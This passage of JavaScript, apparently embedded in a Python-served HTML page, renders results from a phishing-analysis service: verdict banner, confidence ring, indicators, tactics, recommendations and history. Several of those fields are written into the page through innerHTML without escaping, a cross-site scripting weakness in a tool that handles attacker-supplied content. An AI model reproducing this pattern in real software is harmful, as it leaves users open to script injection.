  const colors = { PHISHING:'#ff1744', SUSPICIOUS:'#ff9100', LEGITIMATE:'#00e676', UNKNOWN:'#5a7a9a' };

  // Banner
  const banner = document.getElementById('verdictBanner');
  banner.className = 'verdict-banner ' + verdict;
  document.getElementById('verdictIcon').textContent   = icons[verdict] || '❓';
  document.getElementById('verdictLabel').textContent  = verdict;
  document.getElementById('verdictSummary').textContent = a.summary || '';
  document.getElementById('riskBadge').textContent     = `RISK: ${risk}`;
  document.getElementById('riskBadge').style.color     = colors[verdict];

  // Confidence ring
  const circumference = 188.5;
  const offset = circumference - (conf / 100) * circumference;
  const circle = document.getElementById('confCircle');
  circle.style.stroke = colors[verdict];
  setTimeout(() => { circle.style.strokeDashoffset = offset; }, 100);
  document.getElementById('confVal').textContent = conf + '%';

  // Indicators
  const indList = document.getElementById('indicatorsList');
  const inds = a.indicators || [];
  if (inds.length === 0) {
    indList.innerHTML = '<div style="color:var(--muted);font-family:var(--mono);font-size:12px;padding:8px 0">No specific indicators found.</div>';
  } else {
    indList.innerHTML = inds.map(ind => `
      <div class="indicator">
        <span class="ind-sev ${ind.severity || 'LOW'}">${(ind.severity||'LOW').toUpperCase()}</span>
        <div class="ind-content">
          <div class="ind-type">${ind.type || ''}</div>
          <div class="ind-desc">${ind.description || ''}</div>
        </div>
      </div>
    `).join('');
  }

  // Tactics
  const tactics = a.tactics || [];
  document.getElementById('tacticsList').innerHTML = tactics.length
    ? tactics.map(t => `<span class="tactic-chip">⚡ ${t}</span>`).join('')
    : '<span style="color:var(--muted);font-family:var(--mono);font-size:12px">None identified</span>';

  // Recommendations
  const recs = a.recommendations || [];
  document.getElementById('recsList').innerHTML = recs.length
    ? recs.map((r, i) => `
        <div class="rec-item">
          <span class="rec-num">${String(i+1).padStart(2,'0')}.</span>
          <span>${r}</span>
        </div>
      `).join('')
    : '<div style="color:var(--muted);font-size:13px">No recommendations.</div>';

  // Detailed analysis
  document.getElementById('detailedText').textContent = a.detailed_analysis || 'No detailed analysis provided.';

  // Meta row
  const ts = a.timestamp ? new Date(a.timestamp).toLocaleTimeString() : 'N/A';
  document.getElementById('metaRow').innerHTML = `
    <span>⏱ <strong>${ts}</strong></span>
    <span>🤖 Model: <strong>${a.model_used || 'N/A'}</strong></span>
    <span>🔢 Tokens: <strong>${a.tokens_used || 'N/A'}</strong></span>
    <span>📊 Confidence: <strong>${conf}%</strong></span>
  `;

  const resultsEl = document.getElementById('results');
  resultsEl.style.display = 'block';
  resultsEl.scrollIntoView({ behavior: 'smooth', block: 'start' });
}

// ── HISTORY ────────────────────────────────
function saveHistory(label, analysis, type) {
  const verdict = (analysis.verdict || 'UNKNOWN').toUpperCase();
  const colors  = { PHISHING:'#ff1744', SUSPICIOUS:'#ff9100', LEGITIMATE:'#00e676', UNKNOWN:'#5a7a9a' };
  analysisHistory.unshift({ label, verdict, type, analysis, time: new Date() });

  const list = document.getElementById('historyList');
  list.innerHTML = analysisHistory.map((h, i) => `
    <div class="history-item" onclick="showHistoryItem(${i})">
      <div class="hist-verdict-dot" style="background:${colors[h.verdict]||'#5a7a9a'};box-shadow:0 0 6px ${colors[h.verdict]||'#5a7a9a'}"></div>
      <div class="hist-info">
        <div class="hist-title">${h.label}</div>
        <div class="hist-sub">${h.type.toUpperCase()} • ${h.time.toLocaleTimeString()}</div>
      </div>
      <div class="hist-verdict" style="color:${colors[h.verdict]||'#5a7a9a'}">${h.verdict}</div>
    </div>
  `).join('');
}

function showHistoryItem(index) {
  const h = analysisHistory[index];
  renderResults(h.analysis);
  document.getElementById('results').scrollIntoView({ behavior: 'smooth' });
}

// ── ERROR ──────────────────────────────────
function showError(msg) {
  const box = document.getElementById('errorBox');
  box.textContent = '⚠️ ' + msg;
  box.style.display = 'block';
  box.scrollIntoView({ behavior: 'smooth' });
}

// ── HEALTH CHECK ───────────────────────────
async function checkHealth() {
  try {
    const r = await fetch(API_BASE + '/health');
    const d = await r.json();
    if (d.status === 'ok') {
      document.getElementById('statusLabel').textContent = 'ONLINE';
    }
  } catch {
    document.getElementById('statusLabel').textContent = 'OFFLINE';
    document.querySelector('.dot').style.background = '#ff1744';
    document.querySelector('.dot').style.boxShadow = '0 0 8px #ff1744';
  }
}
checkHealth();
</script>
</body>
</html>"""



